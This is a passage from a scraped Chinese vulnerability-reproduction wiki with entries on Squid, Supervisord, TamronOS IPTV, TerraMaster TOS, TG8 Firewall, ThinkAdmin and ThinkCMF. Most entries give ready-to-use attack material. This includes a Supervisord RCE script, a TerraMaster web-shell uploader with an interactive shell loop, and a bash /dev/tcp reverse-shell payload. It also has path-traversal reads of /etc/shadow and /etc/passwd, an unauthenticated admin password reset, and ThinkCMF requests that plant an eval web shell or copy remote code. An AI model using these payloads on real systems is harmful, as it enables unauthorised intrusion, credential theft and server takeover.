Squid是一个开源的高性能的代理缓存服务器。它接受来自客户端的请求并适当地处理这些请求。例如，如果一个人想下载一web页面，他请求Squid为他取得这个页面。Squid随之连接到远程服务器并向这个页面发出请求。然后，Squid显式地聚集数据到客户端机器，而且同时复制一份。当下一次有人需要同一页面时，Squid可以简单地从磁盘中读到它，那样数据迅即就会传输到客户机上。当前的Squid可以处理HTTP，FTP，GOPHER，SSL和WAIS等协议。 几个月之前，Synacktiv teams对Squid的源码进行审计，发现了几个漏洞，其中一个是在Digest authentication过程中触发的敏感信息泄漏漏洞。 二、漏洞影响 三、复现过程 漏洞分析 漏洞发生在fixHeader函数。nonce变量通过authenticateDigestNonceNew函数申请，authenticateDigestNonceNonceb64取出nonce变量的值，通过httpHeaderPutStrf发送给客户端。 Squid敏感信息泄漏/media/rId25.jpg)authenticateDigestNonceNonceb64函数单纯的取出了nonce->key的值，重点看下nonce变量和nonce->key的赋值过程。 Squid敏感信息泄漏/media/rId26.png) 函数authenticateDigestNonceNew申请nonce变量Squid敏感信息泄漏/media/rId27.png) authDigestNonceEncode函数对nonce->noncedata的地址base64编码，赋值给nonce->key Squid敏感信息泄漏/media/rId28.png) 最后response header中的nonce字段就是base64编码之后的nonce->noncedata的地址。 漏洞复现 下载Squid有漏洞的版本，这里我选择了squid/3.5.28。编译安装 ./configure --enable-auth --enable-auth-digest make -j4 make install 安装完成之后squid的主要目录结构如下： /usr/local/squid/ ├── sbin │ └── squid //squid程序 ├── libexec //辅助程序 │ ├── basic_smb_auth │ └── digest_file_auth └── etc │ └── squid.conf //配置文件 └── logs //运行日志 ├── access.log └── cache.log 修改配置文件，增加一些内容开启digest auth。 auth_param digest program auth_param digest children 8 auth_param digest realm Access to Squid auth_param digest nonce_garbage_interval 10 minutes auth_param digest nonce_max_duration 45 minutes auth_param digest nonce_max_count 100 auth_param digest nonce_strictness on 运行squid程序，通过squid代理，访问某个网站。返回header中nonce字段就是泄漏的内存地址。 curl -I -x 192.168.6.22:3128 https://www.0-sec.org/ HTTP/1.1 407 Proxy Authentication Required Server: squid/3.5.28 Mime-Version: 1.0 Date: Wed, 13 May 2020 13:28:15 GMT Content-Type: text/html;charset=utf-8 Content-Length: 3526 X-Squid-Error: ERR_CACHE_ACCESS_DENIED 0 Vary: Accept-Language Content-Language: en Proxy-Authenticate: Digest realm=\"Access to Squid\", nonce=\"7/W7XgAAAABwTjQEilUAAE+y+jgAAAAA\", qop=\"auth\", stale=false X-Cache: MISS from test Via: 1.1 test (squid/3.5.28) Connection: keep-alive 参考链接 https://xz.aliyun.com/t/7771 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:44 "},"Web安全/Supervisord/（CVE-2017-11610）Supervisord 远程命令执行漏洞/（CVE-2017-11610）Supervisord 远程命令执行漏洞.html":{"url":"Web安全/Supervisord/（CVE-2017-11610）Supervisord 远程命令执行漏洞/（CVE-2017-11610）Supervisord 远程命令执行漏洞.html","title":"（CVE-2017-11610）Supervisord 远程命令执行漏洞","keywords":"","body":"（CVE-2017-11610）Supervisord 远程命令执行漏洞 一、漏洞简介 Supervisor是一套进程控制系统，用于监视和控制类Unix系统上的进程。XML-RPC server是其中的一个XML-RPC服务器。 Supervisor中的XML-RPC服务器存在安全漏洞。远程攻击者可借助特制的XML-RPC请求利用该漏洞执行任意命令。 二、漏洞影响 supervisor 3.0.1之前的版本，3.1.4之前的3.1.x版本，3.2.4之前的3.2.x版本，3.3.3之前的3.3.x版本。 三、复现过程 直接执行任意命令： POST /RPC2 HTTP/1.1 Host: www.0-sec.org Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 213 supervisor.supervisord.options.warnings.linecache.os.system touch /tmp/success Supervisord远程命令执行漏洞/media/rId24.png) 关于直接回显的POC \\@Ricter 在微博上提出的一个思路，甚是有效，就是将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。 写了个简单的POC：直接贴出来吧： #!/usr/bin/env python3 import xmlrpc.client import sys target = sys.argv[1] command = sys.argv[2] with xmlrpc.client.ServerProxy(target) as proxy: old = getattr(proxy, 'supervisor.readLog')(0,0) logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')() getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile)) result = getattr(proxy, 'supervisor.readLog')(0,0) print(result[len(old):]) 使用Python3执行并获取结果：./poc.py \"http://www.0-sec.org:9001/RPC2\" \"command\"：Supervisord远程命令执行漏洞/media/rId26.png) 参考链接 https://vulhub.org/\\#/environments/supervisor/CVE-2017-11610/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:46 "},"Web安全/TamronOS-IPTV/TamronOS IPTV系统后台任意文件下载/TamronOS IPTV系统后台任意文件下载.html":{"url":"Web安全/TamronOS-IPTV/TamronOS IPTV系统后台任意文件下载/TamronOS IPTV系统后台任意文件下载.html","title":"TamronOS IPTV系统后台任意文件下载","keywords":"","body":"TamronOS IPTV系统后台任意文件下载 漏洞描述 TamronOS IPTV系统存在任意文件下载 漏洞影响 TamronOS IPTV V5 3.6.6 FOFA title=\"TamronOS IPTV系统\" POC 1）登录界面 2）该系统默认弱口令admin/123456,登录后的界面如下也可以试试test/123456 4）存在下载的地方，下载抓包 修改参数，读取文件成功POC如下 GET /download/backup?name=./../../../../../etc/shadow Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:47 "},"Web安全/TamronOS-IPTV/TamronOS IPTV系统存在任意用户添加修改/TamronOS IPTV系统存在任意用户添加修改.html":{"url":"Web安全/TamronOS-IPTV/TamronOS IPTV系统存在任意用户添加修改/TamronOS IPTV系统存在任意用户添加修改.html","title":"TamronOS IPTV系统存在任意用户添加修改","keywords":"","body":"TamronOS IPTV系统存在任意用户添加修改 漏洞描述 TamronOS IPTV系统存在任意用户添加修改,攻击者可以利用此漏洞新增管理员，或者利用此漏洞重置管理员账户密码。 漏洞影响 TamronOS IPTV v5 3..6.6 FOFA title=\"TamronOS IPTV系统\" 复现 1）登录界面 2）POC如下,直接修改用户名密码为admin/123456 /api/manager/submit?group=1&password=123456&rnd=0.27576036347932775&status=1&username=admin 3）登录 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:53 "},"Web安全/TamronOS-IPTV/TamronOS IPTV系统存在前台命令执行漏洞/TamronOS IPTV系统存在前台命令执行漏洞.html":{"url":"Web安全/TamronOS-IPTV/TamronOS IPTV系统存在前台命令执行漏洞/TamronOS IPTV系统存在前台命令执行漏洞.html","title":"TamronOS IPTV系统存在前台命令执行漏洞","keywords":"","body":"TamronOS IPTV系统存在前台命令执行漏洞 漏洞描述 TamronOS IPTV/VOD系统是一套基于Linux内核开发的宽带运营商、酒店、学校直播点播一体解决方案，系统提供了多种客户端（Android机顶盒、电视、PC版点播、手机版点播）方便用户通过不同的设备接入。由于未对ping接口进行限制，造成了命令执行漏洞。并且可以前台命令执行 漏洞影响 TamronOS IPTV 所有版本 FOFA title=\"TamronOS IPTV系统\" 复现 1）登录界面 2）POC如下： /api/ping?count=5&host=;id;&port=80&source=1.1.1.1&type=icmp 3) EXP如下： 然后利用POC去前台(未登录状态)尝试进行命令执行： 上图为没有cookie的未登录状态进行命令执行。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:58 "},"Web安全/TerraMaster TOS/TerraMaster TOS RCE CVE-2020-28188/TerraMaster TOS RCE CVE-2020-28188.html":{"url":"Web安全/TerraMaster TOS/TerraMaster TOS RCE CVE-2020-28188/TerraMaster TOS RCE CVE-2020-28188.html","title":"Terra Master TOS RCE CVE 2020 28188","keywords":"","body":"TerraMaster TOS RCE CVE-2020-28188 漏洞描述 TerraMaster TOS 4.2.06 以下中 makecvs.php 存在任意文件写入，攻击者可以上传恶意文件控制服务器 漏洞影响 TerraMaster TOS FOFA \"TerraMaster\" && header=\"TOS\" 漏洞复现 登录页面如下 存在漏洞的为 /include/makecvs.php 中的Event参数 使用EXP文件上传并执行命令 漏洞POC # Exploit Title: TerraMaster TOS 4.2.06 - RCE (Unauthenticated) # Date: 12/12/2020 # Exploit Author: IHTeam # Full Write-up: https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/ # Vendor Homepage: https://www.terra-master.com/ # Version: \\\" >> /usr/www/\"+shell_filename+\" && chmod +x /usr/www/\"+shell_filename+\"||\" payload = urllib.parse.quote(payload, safe='') print(\"[/] Uploading shell...\") response = requests.get(url+'/include/makecvs.php?Event='+payload, headers=headers, verify=False) time.sleep(1) response = requests.get(url+'/'+shell_filename+'?cmd=cat /etc/passwd', headers=headers, verify=False) if ('root:' in str(response.content, 'utf-8')): print(\"[+] Upload succeeded\") else: print(\"\\n[-] Error uploading shell: \", response.content) sys.exit() def interactive_shell(url, headers, shell_filename, cmd): response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(cmd, safe=''), headers=headers, verify=False) print(str(response.text)+\"\\n\") def delete_shell(url, headers, shell_filename): delcmd = \"rm /usr/www/\"+shell_filename response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(delcmd, safe=''), headers=headers, verify=False) print(\"\\n[+] Shell deleted\") upload_shell(url, headers, shell_filename) try: while True: cmd = input(\"# \") interactive_shell(url, headers, shell_filename, cmd) except: delete_shell(url, headers, shell_filename) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:02 "},"Web安全/TerraMaster TOS/TerraMaster TOS 任意文件读取漏洞 CVE-2020-28187/TerraMaster TOS 任意文件读取漏洞 CVE-2020-28187.html":{"url":"Web安全/TerraMaster TOS/TerraMaster TOS 任意文件读取漏洞 CVE-2020-28187/TerraMaster TOS 任意文件读取漏洞 CVE-2020-28187.html","title":"TerraMaster TOS 任意文件读取漏洞 CVE-2020-28187","keywords":"","body":"TerraMaster TOS 任意文件读取漏洞 CVE-2020-28187 漏洞描述 TerraMaster TOS 漏洞影响 TerraMaster TOS FOFA \"TerraMaster\" && header=\"TOS\" 漏洞复现 验证漏洞的POC为 /tos/index.php?editor/fileGet&filename=../../../../../../etc/passwd Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:03 "},"Web安全/TerraMaster TOS/TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186/TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186.html":{"url":"Web安全/TerraMaster TOS/TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186/TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186.html","title":"TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186","keywords":"","body":"TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186 漏洞描述 TerraMaster TOS 漏洞影响 TerraMaster TOS FOFA \"TerraMaster\" && header=\"TOS\" 漏洞复现 首先需要知道已知用户名，可以参考 TerraMaster TOS 用户枚举漏洞 CVE-2020-28185 获取已知的用户名 重置页面输入获取的账号和邮箱 点击确定，抓包更换邮箱接收验证码 通过接收的验证码即可更换账号密码登录后台 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:07 "},"Web安全/TerraMaster TOS/TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187/TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187.html":{"url":"Web安全/TerraMaster TOS/TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187/TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187.html","title":"TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187","keywords":"","body":"TerraMaster TOS 任意文件读取漏洞 CVE-2020-28187 漏洞描述 TerraMaster TOS 漏洞影响 TerraMaster TOS FOFA \"TerraMaster\" && header=\"TOS\" 漏洞复现 登陆后访问，验证漏洞的POC为 /tos/index.php?editor/fileGet&filename=../../../../../../etc/passwd Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:09 "},"Web安全/TerraMaster TOS/TerraMaster TOS 用户枚举漏洞 CVE-2020-28185/TerraMaster TOS 用户枚举漏洞 CVE-2020-28185.html":{"url":"Web安全/TerraMaster TOS/TerraMaster TOS 用户枚举漏洞 CVE-2020-28185/TerraMaster TOS 用户枚举漏洞 CVE-2020-28185.html","title":"TerraMaster TOS 用户枚举漏洞 CVE-2020-28185","keywords":"","body":"TerraMaster TOS 用户枚举漏洞 CVE-2020-28185 漏洞描述 TerraMaster TOS 存在用户枚举漏洞，通过wizard/initialise.php页面的username参数即可枚举系统中的用户，以及泄露邮箱信息 漏洞影响 TerraMaster TOS FOFA \"TerraMaster\" && header=\"TOS\" 漏洞复现 漏洞点来源于找回密码的用户存在校验 输入用户名 admin 点击确定，查看Burp捕获的包 其中有一个请求包用于确认用户admin是否存在 存在则返回用户的邮箱信息 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:10 "},"Web安全/TG8/TG8 Firewall RCE 和 信息泄露/TG8 Firewall RCE 和 信息泄露.html":{"url":"Web安全/TG8/TG8 Firewall RCE 和 信息泄露/TG8 Firewall RCE 和 信息泄露.html","title":"TG8 Firewall RCE 和 信息泄露","keywords":"","body":"漏洞描述 TG8 Firewall RCE 和 信息泄露 漏洞影响 TG8防火墙 代码审计 该漏洞原因为在index.php文件中调用了runphpcmd.php，其中一行代码为 'sudo /home/TG8/v3/syscmd/check_gui_login.sh ' + username + ' ' + pass; 从以上可以看到以sudo来调用cmd，显然这里我们可以进行替换，进行任意命令执行。但是我们还有看一下runphpcmd.php里面是否有对其的限制和过滤，runphpcmd.php源码为： function checkLogin() { var username = $('input[name=u]').val(); var pass = $('input[name=p]').val(); var cmd = 'sudo /home/TG8/v3/syscmd/check_gui_login.sh ' + username + ' ' + pass; $.ajax({ url: \"runphpcmd.php\", type: \"post\", dataType: \"json\", cache: \"false\", data: { syscmd: cmd }, success: function (x) { if (x == 'OK') { ok(username); } else { failed(); } }, error: function () { ok(username); // alert(\"failure to excute the command\"); } }) } 从以上源码可以看出来，并没有对syscmd的内容进行验证，结果直接就以json格式返回给调用者。 $output); // Encoding array in JSON format echo json_encode($output); ?> 所以我们就可以构造payload了，如下： POST /admin/runphpcmd.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 68 Connection: keep-alive syscmd=sudo+%2Fhome%2FTG8%2Fv3%2Fsyscmd%2Fcheck_gui_login.sh+%3Bbash%2F-i%2F>&%2F/dev/tcp/127.0.0.1/10086%2F0>&1%3B++local 空格用%2f替换，‘;’用%3B替换 2、信息泄露 任何用户都可以通过访问以下url路径来枚举防火墙的用户和密码信息。 http://127.0.0.1/data/w-341.tg http://127.0.0.1/data/w-342.tg http://127.0.0.1/data/r-341.tg http://127.0.0.1/data/r-342.tg Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:11 "},"Web安全/ThinkAdmin/（ CVE-2020-25540）ThinkAdmin 未授权列目录_任意文件读取/（ CVE-2020-25540）ThinkAdmin 未授权列目录_任意文件读取.html":{"url":"Web安全/ThinkAdmin/（ CVE-2020-25540）ThinkAdmin 未授权列目录_任意文件读取/（ CVE-2020-25540）ThinkAdmin 未授权列目录_任意文件读取.html","title":"（ CVE-2020-25540）ThinkAdmin 未授权列目录_任意文件读取","keywords":"","body":"（ CVE-2020-25540）ThinkAdmin 未授权列目录/任意文件读取 一、漏洞简介 二、漏洞影响 ThinkAdmin v6 ThinkAdmin v5（只能读取文件） 三、复现过程 app/admin/controller/api/Update.php存在3个function，都是不用登录认证就可以使用的，引用列表如下： namespace app\\admin\\controller\\api; use think\\admin\\Controller; use think\\admin\\service\\InstallService; use think\\admin\\service\\ModuleService; version()可以获取到当前版本：2020.08.03.01，≤这个版本的都有可能存在漏洞 URL：https://www.0-sec.org/ThinkAdmin/public/admin.html?s=admin/api.Update/version 列目录 node()： /** * 读取文件列表 */ public function node() { $this->success('获取文件列表成功！', InstallService::instance()->getList( json_decode($this->request->post('rules', '[]', ''), true), json_decode($this->request->post('ignore', '[]', ''), true) )); } 直接把POST的rules和ignore参数传给InstallService::instance()->getList()，根据上面的use引用可以知道文件路径在vendor/zoujingli/think-library/src/service/InstallService.php： /** * 获取文件信息列表 * @param array $rules 文件规则 * @param array $ignore 忽略规则 * @param array $data 扫描结果列表 * @return array */ public function getList(array $rules, array $ignore = [], array $data = []): array { // 扫描规则文件 foreach ($rules as $key => $rule) { $name = strtr(trim($rule, '\\\\/'), '\\\\', '/'); $data = array_merge($data, $this->_scanList($this->root . $name)); } // 清除忽略文件 foreach ($data as $key => $item) foreach ($ignore as $ign) { if (stripos($item['name'], $ign) === 0) unset($data[$key]); } // 返回文件数据 return ['rules' => $rules, 'ignore' => $ignore, 'list' => $data]; } $ignore可以不用关注，他会透过_scanList()去遍历$rules数组，调用scanDirectory()去递归遍历目录下的文件，最后在透过_getInfo()去获取文件名与哈希，由下面代码可以知道程序没有任何验证，攻击者可以在未授权的情况下读取服务器的文件列表。 /** * 获取目录文件列表 * @param string $path 待扫描目录 * @param array $data 扫描结果 * @return array */ private function _scanList($path, $data = []): array { foreach (NodeService::instance()->scanDirectory($path, [], null) as $file) { $data[] = $this->_getInfo(strtr($file, '\\\\', '/')); } return $data; } /** * 获取所有PHP文件列表 * @param string $path 扫描目录 * @param array $data 额外数据 * @param string $ext 文件后缀 * @return array */ public function scanDirectory($path, $data = [], $ext = 'php') { if (file_exists($path)) if (is_file($path)) $data[] = $path; elseif (is_dir($path)) foreach (scandir($path) as $item) if ($item[0] !== '.') { $realpath = rtrim($path, '\\\\/') . DIRECTORY_SEPARATOR . $item; if (is_readable($realpath)) if (is_dir($realpath)) { $data = $this->scanDirectory($realpath, $data, $ext); } elseif (is_file($realpath) && (is_null($ext) || pathinfo($realpath, 4) === $ext)) { $data[] = strtr($realpath, '\\\\', '/'); } } return $data; } /** * 获取指定文件信息 * @param string $path 文件路径 * @return array */ private function _getInfo($path): array { return [ 'name' => str_replace($this->root, '', $path), 'hash' => md5(preg_replace('/\\s+/', '', file_get_contents($path))), ]; } 读取网站根目录Payload https://www.0-sec.org/ThinkAdmin/public/admin.html?s=admin/api.Update/node POST: rules=[\"/\"] 也可以使用../来进行目录穿越 rules=[\"../../../\"] 演示站： ThinkAdmin未授权列目录_任意文件读取/media/rId25.png) 任意文件读取 get()： /** * 读取文件内容 */ public function get() { $filename = decode(input('encode', '0')); if (!ModuleService::instance()->checkAllowDownload($filename)) { $this->error('下载的文件不在认证规则中！'); } if (file_exists($realname = $this->app->getRootPath() . $filename)) { $this->success('读取文件内容成功！', [ 'content' => base64_encode(file_get_contents($realname)), ]); } else { $this->error('读取文件内容失败！'); } } 首先从GET读取encode参数并使用decode()解码： /** * 解密 UTF8 字符串 * @param string $content * @return string */ function decode($content) { $chars = ''; foreach (str_split($content, 2) as $char) { $chars .= chr(intval(base_convert($char, 36, 10))); } return iconv('GBK//TRANSLIT', 'UTF-8', $chars); } 解密UTF8字符串的，刚好上面有个加密UTF8字符串的encode()，攻击时直接调用那个就可以了： /** * 加密 UTF8 字符串 * @param string $content * @return string */ function encode($content) { [$chars, $length] = ['', strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content))]; for ($i = 0; $i 跟进ModuleService::instance()->checkAllowDownload()，文件路径vendor/zoujingli/think-library/src/service/ModuleService.php： /** * 检查文件是否可下载 * @param string $name 文件名称 * @return boolean */ public function checkAllowDownload($name): bool { // 禁止下载数据库配置文件 if (stripos($name, 'database.php') !== false) { return false; } // 检查允许下载的文件规则 foreach ($this->getAllowDownloadRule() as $rule) { if (stripos($name, $rule) !== false) return true; } // 不在允许下载的文件规则 return false; } 首先$name不能够是database.php，接着跟进getAllowDownloadRule()： /** * 获取允许下载的规则 * @return array */ public function getAllowDownloadRule(): array { $data = $this->app->cache->get('moduleAllowRule', []); if (is_array($data) && count($data) > 0) return $data; $data = ['config', 'public/static', 'public/router.php', 'public/index.php']; foreach (array_keys($this->getModules()) as $name) $data[] = \"app/{$name}\"; $this->app->cache->set('moduleAllowRule', $data, 30); return $data; } 有一个允许的列表： config public/static public/router.php public/index.php app/admin app/wechat 也就是说$name必须要不是database.php且要在允许列表内的文件才能够被读取，先绕过安全列表的限制，比如读取根目录的1.txt，只需要传入： public/static/../../1.txt 而database.php的限制在Linux下应该是没办法绕过的，但是在Windows下可以透过\"来替换.，也就是传入： public/static/../../config/database\"php 对应encode()后的结果为： 34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34 Windows读取database.php： ThinkAdmin未授权列目录_任意文件读取/media/rId27.png) 演示站读取/etc/passwd： ThinkAdmin未授权列目录_任意文件读取/media/rId28.png) v5连允许列表都没有，可以直接读任意文件。 参考链接 https://github.com/zoujingli/ThinkAdmin/issues/244 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:13 "},"Web安全/ThinkCMF/（CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞/（CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞.html":{"url":"Web安全/ThinkCMF/（CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞/（CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞.html","title":"（CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞","keywords":"","body":"（CVE-2019-7580）ThinkCMF 5.0.190111 后台代码执行漏洞 一、漏洞简介 二、漏洞影响 ThinkCMF 5.0.190111 三、复现过程 0x01 利用过程： 后台登录状态下， 1、将payload插入数据库并读取然后写入data/conf/route.php文件 POST /portal/admin_category/addpost.html HTTP/1.1 Host: www.0-sec.org Content-Length: 183 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: PHPSESSID=of2ar92rpeucrh4cg6s4t4dae6; admin_username=admin Connection: close parent_id=0&name=111&alias=1'%3D%3Earray(%22%22)%2Cphpinfo()%2C'2 2、然后访问： /portal/admin_category/index.html 触发 include data/conf/route.php 操作，执行payload。下图以执行sleep(5)作为演示。 ThinkCMF5.0.190111后台代码执行漏洞/media/rId25.png) ThinkCMF5.0.190111后台代码执行漏洞/media/rId26.gif) 补充 poc只是phpinfo,用eval一句话，或者用fputs写马 等都会报错 直接getshell exp 1'=>array(\"\",\"\"),copy(\"http://t00ls.com/1.txt\",\"1.php\"),'2 这样网站也会崩掉 但是会再public下生成1.php 得快速连上，再清空thinkcmf\\data\\conf\\route.php 文件 网站方可恢复正常 0x02 利用过程与分析 1、将payload插入数据库，写入data/conf/route.php文件 程序的入口是index.php,在index.php中\\think\\App::run()执行应用。 ThinkCMF5.0.190111后台代码执行漏洞/media/rId30.png) 在App.php的run()函数139行，执行sef::exec(); ThinkCMF5.0.190111后台代码执行漏洞/media/rId31.png) 通过解析url，得到处理此次请求的控制器、类、函数，即AdminCategoryController.php的addPost函数。然后调用self::invokeMethod()。 ThinkCMF5.0.190111后台代码执行漏洞/media/rId32.png) 通过反射执行AdminCategoryController.php的addPost函数。 在addPost函数中，从$this->request->param()函数中得到请求中的参数传递给$data。 ThinkCMF5.0.190111后台代码执行漏洞/media/rId33.png) 然后通过$this->validata调用父类(./simplewind/thinkphp/library/think/Controller.php)的validata函数进行过滤。然后将$data传入./app/portal/model/PortalCategoryModel.php的addCategory函数进行实际的\\\"添加分类\\\"操作。 ThinkCMF5.0.190111后台代码执行漏洞/media/rId34.png) 在addCategory函数中，184行这一句： $findRoute = $this->where('full_url', $fullUrl)->find(); 通过查询数据中是否存在对应的url，由于是第一次插入，所以这里并没有查到。 154行和155行通过setRoute函数对数据库进行了两次插入操作。 根入setRoute函数， ThinkCMF5.0.190111后台代码执行漏洞/media/rId35.png) 其中$fullUrl和$url的值如截图所示。 继续跟， ThinkCMF5.0.190111后台代码执行漏洞/media/rId36.png) 在34行从数据库中查询查询相关数据， $routes = $this->where(\"status\", 1)->order(\"list_order asc\")->select(); 在addCategory函数的157行调用 $routeModel->getRoutes(true); 最终得到$allroutes的值,创建data/conf目录，然后拼接待写入的route.php文件的完整路径，最后调用file_put_contents()完成写入。可见这个漏洞在于没有对alias参数中的单引号进行过滤，导致可通过闭合前后的单引号插入用户可控的payload。 写入前后对比如下： ThinkCMF5.0.190111后台代码执行漏洞/media/rId37.png) 2、触发payload执行 带着登录的cookie访问/portal/admin_category/index.html，调用routeCheck函数进行url路由检测 ThinkCMF5.0.190111后台代码执行漏洞/media/rId39.png) 这里先 include app/route.php ThinkCMF5.0.190111后台代码执行漏洞/media/rId40.png) 然后， include data/conf/route.php ThinkCMF5.0.190111后台代码执行漏洞/media/rId41.png) 最终执行我们的payload：phpinfo()。 ThinkCMF5.0.190111后台代码执行漏洞/media/rId42.png) 参考链接 https://xz.aliyun.com/t/3997#toc-6 https://www.t00ls.net/thread-55060-1-1.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:41 "},"Web安全/ThinkCMF/ThinkCMF 框架上的任意内容包含漏洞/ThinkCMF 框架上的任意内容包含漏洞.html":{"url":"Web安全/ThinkCMF/ThinkCMF 框架上的任意内容包含漏洞/ThinkCMF 框架上的任意内容包含漏洞.html","title":"ThinkCMF 框架上的任意内容包含漏洞","keywords":"","body":"ThinkCMF 框架上的任意内容包含漏洞 一、漏洞简介 二、漏洞影响 ThinkCMF X1.6.0 ThinkCMF X2.1.0 ThinkCMF X2.2.0 ThinkCMF X2.2.1 ThinkCMF X2.2.2 三、复现过程 根据index.php中的配置，他的项目路径为application，打开 Portal 下的 Controller 目录，选择一个控制类文件。 发现他的父类为Common\\Controller\\HomebaseController。 在HomeBaseController中加入如下测试代码 ThinkPHP是一套基于MVC的应用程序框架，被分成三个核心部件：模型（M）、视图（V）、控制器（C）。 由于添加的代码在控制器中，根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该条件。 可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。 http://127.0.0.1/cmfx-master/?a=test_public&arg1=run%20success HomeBaseController类中有一些访问权限为public的函数， 重点关注display函数.看描述就是可以自定义加载模版，通过 $this->parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。 然后调用THinkphp Controller 函数的display方法 /** * 加载模板和页面输出 可以返回输出内容 * @access public * @param string $templateFile 模板文件名 * @param string $charset 模板输出字符集 * @param string $contentType 输出类型 * @param string $content 模板输出内容 * @return mixed */ public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') { parent::display($this->parseTemplate($templateFile), $charset, $contentType,$content,$prefix); } 再往下就是调用Think View的fetch方法，这里的TMPL_ENGINE_TYPE 为Think, 最终模版内容解析在ParseTemplateBehavior中完成 如下调用即可加载任意文件 http://0-sec.org:81/cmfx-master/?a=display&templateFile=README.md 往下面翻阅发现还有fetch方法，display方法相对fetch只是多了一个render的过程，而且这里不需要知道文件路径 最终完美payload http://0-sec.org/?a=fetch&templateFile=public/index&prefix=''&content=file_put_contents('test.php','') Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:32 "},"Web安全/ThinkCMF/ThinkCMF 缓存Getshell/ThinkCMF 缓存Getshell.html":{"url":"Web安全/ThinkCMF/ThinkCMF 缓存Getshell/ThinkCMF 缓存Getshell.html","title":"ThinkCMF 缓存Getshell","keywords":"","body":"ThinkCMF 缓存Getshell 一、漏洞简介 二、漏洞影响 ThinkCMF X1.6.0ThinkCMF X2.1.0ThinkCMF X2.2.0ThinkCMF X2.2.1ThinkCMF X2.2.2 三、复现过程 常规操作 http://www.0-sec.org/index.php?a=display&templateFile=README.md&content=%3C?php%20phpinfo();die(); 利用缓存文件getshell 由于thinkcmf2.x使用了thinkphp3.x作为开发框架，默认情况下启用了报错日志并且开启了模板缓存，导致可以使用加载一个不存在的模板来将生成一句话的PHP代码写入data/runtime/Logs/Portal目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马m.php 日志文件格式为YY_MM_DD.log，如当前日期为2019年12月12日，日志文件为19_12_12.log，完整路径为 data/runtime/Logs/Portal/19_12_12.log payload 一 首先访问 http://www.0-sec.org/?a=display&templateFile=%3C?php%20file_put_contents(%27m.php%27,%27%3C%3fphp+eval($_POST[%22X%22])%3b%3F%3E%27);die();?%3E 然后请求 http://www.0-sec.org/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log 即可在http://www.0-sec.org/根目录生成m.php，密码是X payload 二 首先访问 http://www.0-sec.org/?a=display&templateFile=%3C%3F%70%68%70%20%65%76%61%6C%28%24%5F%50%4F%53%54%5BX%5D%29%3B%3F%3E 然后菜刀链接（密码也是x） http://www.0-sec.org/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:36 "},"Web安全/ThinkCMF/THINKCMFX_2.2.3漏洞合集/THINKCMFX_2.2.3漏洞合集.html":{"url":"Web安全/ThinkCMF/THINKCMFX_2.2.3漏洞合集/THINKCMFX_2.2.3漏洞合集.html","title":"THINKCMFX_2.2.3漏洞合集","keywords":"","body":"ThinkCMF 2.2.3 漏洞合集 一、漏洞简介 二、漏洞影响 ThinkCMF 2.x 三、复现过程 0x01 前台用户文章编辑提交存在注入 0x01.1 漏洞演示 